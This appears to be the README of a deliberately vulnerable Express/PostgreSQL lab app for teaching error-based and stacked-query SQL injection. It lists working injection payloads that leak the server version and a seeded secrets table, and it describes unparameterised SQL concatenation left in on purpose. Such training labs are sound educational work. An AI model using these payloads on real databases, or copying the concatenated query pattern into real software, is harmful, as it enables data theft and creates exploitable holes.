# example_postgresql_injection_webapp

An **intentionally vulnerable** demo web application that showcases
**error-based SQL injection** against PostgreSQL.

> Educational use only. Do not deploy on a public network.

## What it does

The app exposes two labs, both backed by the same vulnerable INSERT:

```sql
INSERT INTO records (username, email, comment)
VALUES ('<username>', '<email>', '<comment>')
RETURNING ...;
```

All three values are concatenated directly into the SQL string with no
escaping or parameter binding, so every field is a SQL injection sink.

- **Lab 1 — Error-based** (`POST /api/records`). The endpoint returns
  only the *last* result set from `pool.query`, so injection has to
  leak data through PostgreSQL error messages (cast errors, etc.). The
  syntactically-broken SQL is rendered into the result panel — that's
  the visible error oracle.
- **Lab 2 — Stacked-query data leak** (`POST /api/lab2/records`). Same
  vulnerable INSERT, but the response includes *every* result set the
  simple-query protocol returns. Stacked queries leak data directly:
  `'); SELECT version() --` produces a second result set whose rows
  contain the server version.

A "Verbose error responses" toggle at the top of the page controls
whether DB errors come back as the full Postgres JSON
(`error`/`detail`/`position`/`executedSql`) or just a generic 500 with
`ERROR: <message>`.

## Run it

With Docker:

```bash
docker compose up --build
```

Then open <http://localhost:3000>.

Without Docker (requires a local PostgreSQL):

```bash
createdb vulnerable_app
psql vulnerable_app -f db/init.sql
npm install
PGUSER=postgres PGPASSWORD=postgres PGDATABASE=vulnerable_app npm start
```

## Try the injection

All three fields are vulnerable in both labs.

### Lab 1 — Error-based payloads
- Break the syntax: value `'` → `unterminated quoted string ...`.
- Comment out the rest: `username = x', '', '') --` → INSERT closed.
- Cast-error data leak (`comment`):
  ```
  ') , ('x', 'y', (SELECT CAST(version() AS int))) --
  ```
  → `invalid input syntax for type integer: "PostgreSQL 16..."`.
- Leak the seeded flag (`comment`):
  ```
  ') , ('x', 'y', (SELECT CAST(value AS int) FROM secrets WHERE name='flag')) --
  ```

### Lab 2 — Stacked-query payloads
The server splits the constructed SQL on `;` and runs each statement
separately. Errors from the original INSERT (statement 0) are
collapsed to a generic `ERROR: syntax error` /
`ERROR: unterminated quoted string` — **error-based payloads inside
the INSERT body do not leak in Lab 2.** Errors from stacked statements
are returned verbatim.

- Stacked cast-error leak (any field): `'); SELECT CAST(version() AS int) --`
  → response `error`: `invalid input syntax for type integer: "PostgreSQL 16..."`.
- Stacked secrets cast-error leak (any field):
  `'); SELECT CAST((SELECT value FROM secrets WHERE name='flag') AS int) --`
- Stacked SELECT (no error needed): `'); SELECT name, value FROM secrets --`
  → leaked rows appear in `resultSets[1].rows`.
- In-INSERT cast (try this and observe it gets sanitized):
  `') , ('x','y',(SELECT CAST(version() AS int))) --`
  → response `error`: `ERROR: syntax error` (or `unterminated quoted string`),
  no leak.

The response body contains a `resultSets` array with one entry per
successfully executed statement, plus a `statementIndex` on errors so
you can tell which statement triggered the error.

## Files

- `server.js` — Express backend. Vulnerable endpoints: `POST /api/records` (Lab 1, single result set) and `POST /api/lab2/records` (Lab 2, all result sets). Settings: `GET/POST /api/settings`.
- `public/index.html` — Tabbed frontend with both labs and the verbose-errors toggle.
- `db/init.sql` — Schema + a `secrets` table to make exfiltration demos meaningful.
- `docker-compose.yml` — Postgres 16 + Node 20 dev stack.
